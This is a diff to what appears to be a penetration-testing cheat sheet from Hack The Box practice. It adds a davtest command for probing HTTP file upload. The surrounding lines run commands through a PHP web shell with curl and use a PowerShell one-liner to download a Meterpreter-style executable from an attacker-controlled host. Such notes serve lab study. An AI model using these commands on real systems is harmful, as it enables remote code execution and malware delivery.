@@ -594,7 +594,10 @@ $file = [
 Run the php using curl: curl http://10.10.10.9/0xdf.php?cmd=whoami
 #BASTARD HTB
 
-e.) Some other Powershell commands:
+e.) Test HTTP Method to upload files:
+davtest -url http://$IP_ADDRESS
+
+f.) Some other Powershell commands:
 Download a file:
 powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.31:8000/metershell3.exe', 'metershell3.exe')"
 
